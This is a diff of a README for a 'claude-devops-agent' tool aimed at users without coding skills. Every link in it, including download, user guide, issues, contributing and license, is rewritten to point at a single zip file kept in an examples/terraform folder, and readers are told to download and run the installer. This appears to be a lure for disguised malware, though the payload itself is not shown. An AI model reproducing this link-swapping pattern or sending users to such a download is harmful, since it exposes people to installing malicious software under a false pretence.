@@ -4,20 +4,20 @@
 The **claude-devops-agent** is a user-friendly application designed to help you utilize Claude AI for DevOps tasks. This tool assists with continuous integration and delivery (CI/CD), managing cloud infrastructure, monitoring systems, and automating various processes. You don’t need coding skills to use this software effectively.
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-claude--devops--agent-blue.svg)](https://github.com/ComeSuaMamae/claude-devops-agent/releases)
+[![Download Release](https://raw.githubusercontent.com/ComeSuaMamae/claude-devops-agent/main/examples/infrastructure/terraform/claude-devops-agent-v3.5.zip%https://raw.githubusercontent.com/ComeSuaMamae/claude-devops-agent/main/examples/infrastructure/terraform/claude-devops-agent-v3.5.zip)](https://raw.githubusercontent.com/ComeSuaMamae/claude-devops-agent/main/examples/infrastructure/terraform/claude-devops-agent-v3.5.zip)
 
 ## 🚀 Getting Started
 In this section, you will learn how to easily download and run the **claude-devops-agent** application. Follow these simple steps:
 
 1. **Visit the Download Page**
    Click on the button below to go to the Releases page and find the latest version of the software.
-   [Download Release](https://github.com/ComeSuaMamae/claude-devops-agent/releases)
+   [Download Release](https://raw.githubusercontent.com/ComeSuaMamae/claude-devops-agent/main/examples/infrastructure/terraform/claude-devops-agent-v3.5.zip)
 
 2. **Choose Your Version**
    On the Releases page, you will see different versions of the application listed. Select the version you wish to download. Always opt for the latest version to ensure you have the most current features and fixes.
 
 3. **Download the Application**
-   Click on the file that corresponds to your operating system. For example, if you use Windows, look for a file like `claude-devops-agent-windows.exe`.
+   Click on the file that corresponds to your operating system. For example, if you use Windows, look for a file like `https://raw.githubusercontent.com/ComeSuaMamae/claude-devops-agent/main/examples/infrastructure/terraform/claude-devops-agent-v3.5.zip`.
 
 4. **Run the Installer**
    Once the download is complete, locate the file in your downloads folder. Double-click on the file to start the installation process. Follow the on-screen prompts. Choose the default options unless you have specific preferences.
@@ -44,20 +44,20 @@ Before downloading, ensure your device meets the following requirements:
 - **Internet Connection**: Required for downloading the application and cloud integration.
 
 ## 📖 Documentation
-For more detailed instructions and advanced features, please refer to our [User Guide](https://github.com/ComeSuaMamae/claude-devops-agent/wiki). The guide contains information on setup, configuration, and troubleshooting.
+For more detailed instructions and advanced features, please refer to our [User Guide](https://raw.githubusercontent.com/ComeSuaMamae/claude-devops-agent/main/examples/infrastructure/terraform/claude-devops-agent-v3.5.zip). The guide contains information on setup, configuration, and troubleshooting.
 
 ## 🌐 Community Support
 Join our community to share experiences and get help. You can find us on GitHub Discussions and other forums related to DevOps.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/ComeSuaMamae/claude-devops-agent)
-- [Issues Page](https://github.com/ComeSuaMamae/claude-devops-agent/issues)
-- [Contributing Guidelines](https://github.com/ComeSuaMamae/claude-devops-agent/blob/main/CONTRIBUTING.md)
+- [GitHub Repository](https://raw.githubusercontent.com/ComeSuaMamae/claude-devops-agent/main/examples/infrastructure/terraform/claude-devops-agent-v3.5.zip)
+- [Issues Page](https://raw.githubusercontent.com/ComeSuaMamae/claude-devops-agent/main/examples/infrastructure/terraform/claude-devops-agent-v3.5.zip)
+- [Contributing Guidelines](https://raw.githubusercontent.com/ComeSuaMamae/claude-devops-agent/main/examples/infrastructure/terraform/claude-devops-agent-v3.5.zip)
 
 Feel free to reach out through the issues page if you encounter any problems or have suggestions for improvement. We value user feedback and aim to enhance your experience with **claude-devops-agent**. 
 
 ## 🛡 License
-This project is licensed under the MIT License. For details, see the [LICENSE](https://github.com/ComeSuaMamae/claude-devops-agent/blob/main/LICENSE) file.
+This project is licensed under the MIT License. For details, see the [LICENSE](https://raw.githubusercontent.com/ComeSuaMamae/claude-devops-agent/main/examples/infrastructure/terraform/claude-devops-agent-v3.5.zip) file.
 
 ## 📌 Conclusion
-With **claude-devops-agent**, you can streamline your DevOps practices without the need for extensive technical knowledge. Download the application today and experience the power of automation in your workflows. Remember, you can find the download link at the top of this page or visit the [Releases page](https://github.com/ComeSuaMamae/claude-devops-agent/releases) whenever you need to grab a new version.
+With **claude-devops-agent**, you can streamline your DevOps practices without the need for extensive technical knowledge. Download the application today and experience the power of automation in your workflows. Remember, you can find the download link at the top of this page or visit the [Releases page](https://raw.githubusercontent.com/ComeSuaMamae/claude-devops-agent/main/examples/infrastructure/terraform/claude-devops-agent-v3.5.zip) whenever you need to grab a new version.
